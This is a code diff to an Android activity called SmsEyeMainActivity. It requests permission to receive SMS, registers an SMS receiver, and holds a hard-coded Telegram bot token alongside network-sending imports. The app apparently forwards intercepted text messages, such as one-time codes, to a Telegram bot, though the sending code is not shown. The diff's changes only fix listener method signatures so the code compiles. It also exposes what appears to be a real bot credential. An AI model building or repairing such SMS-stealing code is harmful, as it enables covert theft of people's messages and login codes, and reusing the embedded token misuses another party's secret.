@@ -17,8 +17,10 @@ import com.karumi.dexter.Dexter;
 import com.karumi.dexter.PermissionToken;
 import com.karumi.dexter.listener.PermissionRequest;
 import com.karumi.dexter.listener.single.PermissionListener;
+import com.karumi.dexter.listener.PermissionDeniedResponse;
+import com.karumi.dexter.listener.PermissionGrantedResponse;
 
-import com.example.sample.Constants; // ✅ Replace with your actual package
+import com.example.sample.Constants; // ✅ Replace this with your actual constants class
 
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
@@ -30,7 +32,7 @@ import java.util.Locale;
 public class SmsEyeMainActivity extends AppCompatActivity {
 
     private SmsReceiver smsReceiver;
-    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // 🔁 Replace with your bot token
+    private static final String BOT_TOKEN = "8000560638:AAHrOlt9b4U-QKmgnuOBl7bDxGzuz2wGXi4"; // 🔁 Replace with your actual bot token
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -40,18 +42,18 @@ public class SmsEyeMainActivity extends AppCompatActivity {
                 .withPermission(Manifest.permission.RECEIVE_SMS)
                 .withListener(new PermissionListener() {
                     @Override
-                    public void onPermissionGranted(PermissionRequest permissionRequest) {
+                    public void onPermissionGranted(PermissionGrantedResponse response) {
                         Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Granted", Toast.LENGTH_SHORT).show();
                         registerSMSReceiver();
                     }
 
                     @Override
-                    public void onPermissionDenied(PermissionRequest permissionRequest) {
+                    public void onPermissionDenied(PermissionDeniedResponse response) {
                         Toast.makeText(SmsEyeMainActivity.this, "SMS Permission Denied", Toast.LENGTH_SHORT).show();
                     }
 
                     @Override
-                    public void onPermissionRationaleShouldBeShown(PermissionRequest permissionRequest, PermissionToken token) {
+                    public void onPermissionRationaleShouldBeShown(PermissionRequest permission, PermissionToken token) {
                         token.continuePermissionRequest();
                     }
                 })
@@ -121,3 +123,4 @@ public class SmsEyeMainActivity extends AppCompatActivity {
         }
     }
 }
+
